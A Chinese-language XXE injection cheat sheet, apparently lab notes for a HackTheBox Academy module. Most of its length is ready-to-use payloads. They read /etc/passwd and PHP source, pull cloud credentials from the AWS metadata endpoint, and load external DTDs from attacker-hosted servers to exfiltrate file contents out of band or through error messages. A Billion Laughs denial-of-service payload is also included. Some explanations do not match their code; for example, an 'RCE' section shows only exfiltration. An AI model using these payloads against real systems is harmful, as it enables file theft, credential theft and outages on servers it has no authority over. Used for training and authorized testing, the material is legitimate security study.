# XXE

{% hint style="info" %}
`XML External Entity (XXE) Injection` 當 XML 資料未經適當清理或安全解析而從使用者控制的輸入中取得時，就會出現漏洞，這可能允許我們利用 XML 功能執行惡意操作。XXE漏洞可能會對Web應用程式及其後端伺服器造成相當大的損害，從洩漏敏感檔案到關閉後端伺服器，這就是為什麼它被OWASP視為[十大Web安全風險](https://owasp.org/www-project-top-ten/)之一。
{% endhint %}

## <mark style="color:red;">**1. 發現點**</mark>

* **聯繫表單（Contact Form）**：使用者提交的訊息可能被XML解析
* ALL XML
* **文件上傳功能**：應用允許上傳XML格式的文件，例如SVG、DOCX（ZIP包內含XML）
* **API請求（REST/SOAP）**：部分API使用XML作為請求格式
* **SSO（單點登入）**：某些SSO協議（如SAML）使用XML格式傳遞身份驗證數據
*   使用`<!DOCTYPE>` 定義實體來確認伺服器是否解析：

    ```xml
    <!DOCTYPE email [
      <!ENTITY test "XXE Test">
    ]>
    <email>
      &test;
    </email>
    ```

    **如果伺服器回應包含 `XXE Test`，代表存在XXE漏洞**。
* Example
* <pre class="language-xml"><code class="lang-xml">POST /submitDetails.php HTTP/1.1
  Host: 10.129.59.193
  User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
  Accept: */*
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Content-Type: text/plain;charset=UTF-8
  Content-Length: 214
  Origin: http://10.129.59.193
  Connection: keep-alive
  Referer: http://10.129.59.193/

  &#x3C;?xml version="1.0" encoding="UTF-8"?>
    &#x3C;!DOCTYPE email [
      &#x3C;!ENTITY company SYSTEM "file:///etc/passwd">
    ]>
  &#x3C;root>
    &#x3C;name>hack&#x3C;/name>
  <strong>  &#x3C;tel>4324324&#x3C;/tel>
  </strong>  &#x3C;email>&#x26;company;&#x3C;/email>
    &#x3C;message>hackyou&#x3C;/message>
  &#x3C;/root>
  </code></pre>





## <mark style="color:red;">**2. 測試Payload**</mark>



#### **🔹 讀取伺服器上的敏感文件**

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
<email>
  &company;
</email>
```

* **目標**：讀取Linux系統的`/etc/passwd`，如果成功，代表伺服器允許訪問本地文件系統。
* **應對方式**：如果無法回顯數據，嘗試`php://filter/`進行Base64編碼讀取。

#### **🔹 讀取應用程式代碼**

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<email>
  &company;
</email>
```

* **目標**：以Base64格式讀取 `index.php`，然後手動解碼，分析應用的後端邏輯。

#### **🔹 進行內網探測**

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://internal-service.local/admin">
]>
<email>
  &company;
</email>
```

* **目標**：確認內網服務是否可訪問，進一步發動SSRF攻擊。

## <mark style="color:red;">3. 不符合 XML 格式</mark>

### ⭐ 問題背景：

當目標網站會返回 XML 響應，但**返回內容必須符合 XML 格式**時，如果我們直接插入外部實（例如檔案內容），裡面可能會有符號造成 XML 格式錯誤，這會導致回顯失敗。

#### **解決方法**：

用 `<![CDATA[ ]]>` 包裹檔案內容，使其被當成「純文本」處理，這樣就不怕 XML 格式被破壞。

***

### ⭐ **繞過方法 1 — CDATA 包裝**

在 DTD 文件中預先定義好：

```xml
<!ENTITY begin "<![CDATA[">
<!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
<!ENTITY end "]]>">
<!ENTITY joined "&begin;&file;&end;">
```

最後在 XML 裡調用 `&joined;` ，伺服器返回內容就會被包在 `<![CDATA[ ]]>` 裡。



### ⭐ **繞過方法 2 — Parameter Entities（參數實體）**

* 普通 `ENTITY` 是 `&xxe;`
* **參數實體** 是 `%xxe;`，只能在 DTD 裡用
* 它最大的用途：\
  你可以把 `%xxe;` 放在**外部 DTD 文件**，讓目標伺服器去你主機下載 `.dtd`，然後讀取本地文件內容，最後連接成 XML 安全格式輸出。

***



### ⭐ **操作流程範例**

**✅ 1. 本地建立 xxe.dtd 檔案：**

```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > XXE.dtd
```

> 注意最後一行等於告訴 XML「先引入 begin、file、end 三個實體，再合併成一個叫 joined」的最終實體。

***

**✅ 2. 啟動 HTTP 伺服器讓目標伺服器來抓：**

```bash
python3 -m http.server 8000
```

* 此時伺服器在 `http://你的IP:8000/xxe.dtd` 提供下載。



**✅ 3. 向目標提交 payload：**

<pre class="language-xml"><code class="lang-xml">&#x3C;?xml version="1.0" encoding="UTF-8"?>
&#x3C;!DOCTYPE email [
  &#x3C;!ENTITY % begin "&#x3C;![CDATA[">
  &#x3C;!ENTITY % file SYSTEM "file:///flag.php">
  &#x3C;!ENTITY % end "]]>">
  &#x3C;!ENTITY % xxe SYSTEM "http://10.10.14.57:8000/XXE.dtd">
  %xxe;
]>
&#x3C;root>
  &#x3C;name>hack&#x3C;/name>
<strong>  &#x3C;tel>4324324&#x3C;/tel>
</strong>  &#x3C;email>&#x26;joined;&#x3C;/email>
  &#x3C;message>hackyou&#x3C;/message>
&#x3C;/root>
</code></pre>

* 這時候目標伺服器會去你機器下載 `xxe.dtd` ，然後讀取 `submitDetails.php` 檔案並回顯。
* 結果會被包在 `<![CDATA[ 文件內容 ]]>` 裡面，避開 XML 格式限制。



## <mark style="color:red;">4. 基於錯誤的XXE</mark>



### ⭐ 問題背景

* 有時目標網站：
  * 不在 XML 響應中顯示實體結果
  * 不會回傳你控制的內容
* 但如果**伺服器會顯示解析錯誤（error）**，\
  我們就可以透過「故意出錯」\
  把檔案內容注入錯誤訊息中回顯出來！\
  這就叫做 **Error-based XXE** 或 **錯誤型 XXE**。

***

### ⭐ 利用條件：

1. 目標網站不顯示 XML 實體內容。
2. 但它會在 XML 格式錯誤時返回錯誤訊息（如 PHP Warning）。
3. 我們可以透過設計 payload，\
   把本地檔案內容夾帶進錯誤訊息裡。

***

### ⭐ 攻擊思路：

* 我們故意參考一個不存在的實體 `%nonExistingEntity;`。
* 同時把 `file` 實體拼接在錯誤內容中，\
  讓錯誤訊息中顯示「找不到實體」，\
  而這個「錯誤提示」會同時帶出我們指定的本地檔案內容。

***

### ⭐ 操作流程範例：

#### ✅ 1️⃣ 建立本地 `xxe.dtd`：

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

**解釋：**

* `%file;` 會包含 `/etc/hosts` 文件內容
* `%nonExistingEntity;` 是刻意寫不存在的
* 伺服器在解析 `%error;` 時\
  → 會「找不到 nonExistingEntity」並拋出錯誤\
  → 錯誤訊息中會包含 `%file;` 的內容

***

#### ✅ 2️⃣ 啟動 HTTP 伺服器供目標訪問：

```bash
python3 -m http.server 8000
```

***

#### ✅ 3️⃣ 傳送 Payload 給目標：

```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://你的IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

* 目標伺服器會從你的 `xxe.dtd` 檔案讀取內容
* 再觸發錯誤訊息
* 錯誤訊息中就會包含 `/etc/hosts` 檔案內容！

## <mark style="color:red;">5. OOB 資料外洩</mark>

### ⭐ 問題背景

在部分目標系統中：

* 沒有 XML 回顯
* 不會在頁面上顯示任何錯誤
* 也無法利用錯誤型 XXE 看結果

***

### ⭐ 利用條件：

1. 目標存在 XXE 漏洞。
2. 目標不會把檔案內容顯示在回應中（無回顯）。
3. 目標不會顯示 XML 錯誤訊息（無錯誤型 XXE）。
4. 伺服器允許向外發送 HTTP 請求或 DNS 請求。

***

### ⭐ 攻擊思路：

* 我們建立一個**外部 DTD** 檔案。
* 讓伺服器讀取本地檔案內容（例如 `/etc/passwd`）。
* 將這些內容嵌入到一個 `http://你的伺服器/?data=檔案內容` 的請求中。
* 伺服器自動向我們的 HTTP server 發送請求。
* 在我們的 HTTP server 日誌裡就能看到檔案內容（Out-of-band 外洩成功）。

***

### ⭐ 操作流程範例：

#### ✅ 1️⃣ 建立外部 DTD (`xxe.dtd`)

```xml
─[us-academy-1]─[10.10.14.134]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ cat > XXE.dtd << EOF
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/327a6c4304ad5938eaf0efb6cc3e53dc.php">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.14.134:8000/?content=%file;'>">
EOF

```

**說明：**

* `%file;`：從伺服器讀取 `/etc/passwd` 檔案內容
* `%exfil;`：定義 `send` 實體，讓伺服器用 HTTP 發送資料

***

#### ✅ 2️⃣ 啟動本地 HTTP 伺服器：

```bash
python3 -m http.server 8000
```

* 等待伺服器連回來

***

#### ✅ 3️⃣ 發送 XXE Payload 給目標：

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE email [ 
	<!ENTITY % remote SYSTEM "http://PWNIP:8000/XXE.dtd">
	  %remote;
	  %oob;
	]>
	<root>
		&content;
	</root>
```

* 伺服器解析 `%remote;` 下載你的 DTD
* 執行 `%file;` 讀取內容
* 自動透過 HTTP 請求發送資料到你的主機

***

#### ✅ 4️⃣ 觀察結果

* 在本地 server 日誌中你會看到：

```
GET /?data=root:x:0:0:root:/root:/bin/bash HTTP/1.1
```

* `data=` 參數裡就是 `/etc/passwd` 內容。

## <mark style="color:red;">6. 連鎖XXE漏洞</mark>

#### **🔹 XXE + SSRF**

*   若應用允許訪問內部服務，我們可以**透過XXE進行SSRF攻擊**，如請求AWS Metadata：

    ```xml
    <!DOCTYPE email [
      <!ENTITY aws SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
    ]>
    <email>
      &aws;
    </email>
    ```

    * 如果成功，可能獲取雲端伺服器的憑據，進一步控制伺服器！

#### **🔹 XXE + RCE（遠端代碼執行）**

*   如果應用允許解析DTD，則可以透過內部Java類調用命令：

    ```xml
    <!DOCTYPE foo [
      <!ENTITY % remote SYSTEM "http://你的伺服器/evil.dtd">
      %remote;
    ]>
    ```

    **evil.dtd 內容：**

    ```xml
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://你的伺服器/?data=%file;'>">
    %eval;
    %exfil;
    ```

    * 這將會透過**外部HTTP請求洩露`/etc/passwd`的內容**，可進一步嘗試RCE。

#### **🔹 XXE + DoS（拒絕服務攻擊）**

*   `Billion Laughs Attack`（遞歸炸彈）導致伺服器崩潰：

    ```xml
    <!DOCTYPE data [
      <!ENTITY a0 "HAHA">
      <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
      <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
      <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
    ]>
    <data>
      &a3;
    </data>
    ```

    * 這樣會導致伺服器無限解析，進而崩潰（DoS）。

## <mark style="color:red;">6.Skills Assessment</mark>

[<mark style="color:red;">https://academy.hackthebox.com/module/134/section/1219</mark>](https://academy.hackthebox.com/module/134/section/1219)
